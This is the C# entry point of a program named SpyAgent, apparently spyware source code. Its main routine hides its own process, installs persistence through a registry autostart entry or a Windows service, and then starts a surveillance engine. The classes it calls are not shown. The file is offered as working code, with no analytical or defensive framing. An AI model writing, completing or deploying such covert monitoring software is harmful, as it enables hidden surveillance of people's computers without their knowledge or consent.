namespace SpyAgent;

using SpyAgent.Config;
using SpyAgent.Core;
using SpyAgent.Persistence;
using SpyAgent.Stealth;

internal static class Program
{
    private static async Task Main(string[] args)
    {
        if (args.Contains("--install-service"))
        {
            ServiceInstaller.Install();
            return;
        }

        if (args.Contains("--uninstall"))
        {
            ServiceInstaller.Uninstall();
            RegistryAutostart.Remove();
            return;
        }

        ProcessHider.HideCurrentProcess();

        var config = SpyConfig.Load(args);

        if (config.Persistence == "registry")
            RegistryAutostart.Install();
        else if (config.Persistence == "service")
            ServiceInstaller.Install();

        var engine = new SpyEngine(config);
        await engine.RunAsync();
    }
}
